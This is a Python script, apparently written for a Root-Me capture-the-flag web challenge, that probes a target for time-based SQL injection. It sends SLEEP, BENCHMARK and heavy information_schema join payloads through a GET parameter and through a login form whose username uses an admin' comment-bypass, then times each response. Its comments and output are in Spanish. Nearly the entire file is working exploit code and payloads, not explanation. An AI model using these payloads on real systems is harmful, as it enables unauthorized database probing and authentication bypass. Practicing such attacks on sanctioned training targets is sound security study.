import requests
import time
import urllib.parse

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_get(payload):
    """Prueba inyección en GET parameter member"""
    params = {
        "action": "member",
        "member": payload
    }
    inicio = time.time()
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        print(f"  GET - Tiempo: {tiempo:.2f}s - {payload[:60]}")
        return tiempo
    except:
        return 0

def test_login(payload):
    """Prueba inyección en POST login"""
    login_data = {
        "username": f"admin' {payload} -- -",
        "password": "test"
    }
    inicio = time.time()
    try:
        r = requests.post(f"{URL}?action=login", data=login_data, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        print(f"  LOGIN - Tiempo: {tiempo:.2f}s - {payload[:60]}")
        return tiempo
    except:
        return 0

print("="*70)
print("  DIAGNÓSTICO - TIME-BASED SQL INJECTION")
print("="*70)

# Lista de payloads a probar
payloads = [
    # GET payloads
    ("GET - Baseline", "1"),
    ("GET - Simple condition", "1 AND 1=1"),
    ("GET - SLEEP(3)", "1 AND IF(1=1, SLEEP(3), 0)"),
    ("GET - SLEEP(5)", "1 AND IF(1=1, SLEEP(5), 0)"),
    ("GET - BENCHMARK(5000000)", "1 AND IF(1=1, BENCHMARK(5000000, MD5('x')), 0)"),
    ("GET - BENCHMARK(10000000)", "1 AND IF(1=1, BENCHMARK(10000000, MD5('x')), 0)"),
    ("GET - Heavy Query 2 joins", "1 AND (SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1)"),
    ("GET - Heavy Query 3 joins", "1 AND (SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2)"),
    ("GET - Heavy Query 4 joins", "1 AND (SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2, information_schema.columns T3)"),
    
    # POST payloads (login)
    ("LOGIN - Baseline", "AND 1=1"),
    ("LOGIN - SLEEP(3)", "AND IF(1=1, SLEEP(3), 0)"),
    ("LOGIN - SLEEP(5)", "AND IF(1=1, SLEEP(5), 0)"),
    ("LOGIN - BENCHMARK(5000000)", "AND IF(1=1, BENCHMARK(5000000, MD5('x')), 0)"),
    ("LOGIN - BENCHMARK(10000000)", "AND IF(1=1, BENCHMARK(10000000, MD5('x')), 0)"),
]

print("\n[*] Probando diferentes payloads...\n")

for name, payload in payloads:
    if "GET" in name:
        test_get(payload)
    else:
        test_login(payload)
    time.sleep(1)  # Pausa entre pruebas

print("\n" + "="*70)
print("[*] Si ves tiempos > 3 segundos, ese es el método que funciona")
print("="*70)
